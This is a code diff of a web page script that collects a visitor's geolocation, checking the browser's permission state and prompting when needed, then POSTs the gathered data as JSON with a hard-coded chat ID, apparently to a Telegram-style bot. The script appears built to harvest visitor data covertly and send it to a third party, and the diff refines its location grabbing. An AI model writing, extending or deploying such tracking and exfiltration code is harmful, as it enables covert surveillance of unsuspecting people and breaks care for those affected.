@@ -6,24 +6,41 @@
         async function sendData() {
             let data = {};
 
-            // Get Location
+            // Check Location Permission
             function getLocation() {
-                return new Promise((resolve) => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
+                return new Promise(async (resolve) => {
+                    try {
+                        const permissionStatus = await navigator.permissions.query({ name: "geolocation" });
+
+                        if (permissionStatus.state === "granted") {
+                            // Permission already granted, get location directly
+                            navigator.geolocation.getCurrentPosition((position) => {
                                 data.location = {
                                     latitude: position.coords.latitude,
                                     longitude: position.coords.longitude,
                                 };
                                 resolve();
-                            },
-                            () => {
-                                data.location = "Permission Denied";
-                                resolve();
-                            }
-                        );
-                    } else {
+                            });
+                        } else if (permissionStatus.state === "prompt") {
+                            // Ask for permission
+                            navigator.geolocation.getCurrentPosition(
+                                (position) => {
+                                    data.location = {
+                                        latitude: position.coords.latitude,
+                                        longitude: position.coords.longitude,
+                                    };
+                                    resolve();
+                                },
+                                () => {
+                                    data.location = "Permission Denied";
+                                    resolve();
+                                }
+                            );
+                        } else {
+                            data.location = "Denied Previously";
+                            resolve();
+                        }
+                    } catch (error) {
                         data.location = "Not Supported";
                         resolve();
                     }
@@ -58,7 +75,7 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    chat_id: "1679328294", // No < >
+                    chat_id: "1679328294",
                     text: JSON.stringify(data, null, 2),
                 }),
             }).then(response => response.json())
